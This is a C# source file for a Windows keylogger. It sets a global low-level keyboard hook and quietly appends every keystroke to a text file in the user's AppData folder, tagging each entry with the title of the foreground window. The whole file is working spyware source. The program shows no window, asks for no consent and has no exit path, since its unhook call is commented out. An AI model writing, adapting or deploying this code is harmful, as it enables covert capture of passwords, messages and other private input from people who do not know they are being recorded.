using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
    public static class Program
    {
        private static readonly string ApplicationData =
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private static readonly string loggerPath = ApplicationData + @"\qwqdanchunLog.txt";
        private static string CurrentActiveWindowTitle;

        public static void Main()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            //UnhookWindowsHookEx(_hookID);
            //Application.Exit();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                var vkCode = Marshal.ReadInt32(lParam);
                var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                var currentKey = KeyboardLayout((uint)vkCode);

                if (capsLock || shiftPress)
                    currentKey = currentKey.ToUpper();
                else
                    currentKey = currentKey.ToLower();

                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    currentKey = "[" + (Keys)vkCode + "]";

                else
                    switch (((Keys)vkCode).ToString())
                    {
                        case "Space":
                            currentKey = "[SPACE]";
                            break;
                        case "Return":
                            currentKey = "[ENTER]";
                            break;
                        case "Escape":
                            currentKey = "[ESC]";
                            break;
                        case "LControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RControlKey":
                            currentKey = "[CTRL]";
                            break;
                        case "RShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "LShiftKey":
                            currentKey = "[Shift]";
                            break;
                        case "Back":
                            currentKey = "[Back]";
                            break;
                        case "LWin":
                            currentKey = "[WIN]";
                            break;
                        case "Tab":
                            currentKey = "[Tab]";
                            break;
                        case "Capital":
                            if (capsLock)
                                currentKey = "[CAPSLOCK: OFF]";
                            else
                                currentKey = "[CAPSLOCK: ON]";
                            break;
                    }

                using (var sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
                        sw.Write(currentKey);
                    }
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                var sb = new StringBuilder();
                var vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                var scanCode = MapVirtualKey(vkCode, 0);
                var keyboardLayout =
                    GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out var processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch
            {
            }

            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                var hwnd = GetForegroundWindow();
                GetWindowThreadProcessId(hwnd, out var pid);
                var p = Process.GetProcessById((int)pid);
                var title = p.MainWindowTitle;
                if (string.IsNullOrWhiteSpace(title))
                    title = p.ProcessName;
                CurrentActiveWindowTitle = title;
                return title;
            }
            catch (Exception)
            {
                return "???";
            }
        }


        #region "Hooks & Native Methods"

        private const int WM_KEYDOWN = 0x0100;
        private static readonly LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static readonly int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true,
            CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out] [MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        #endregion
    }
}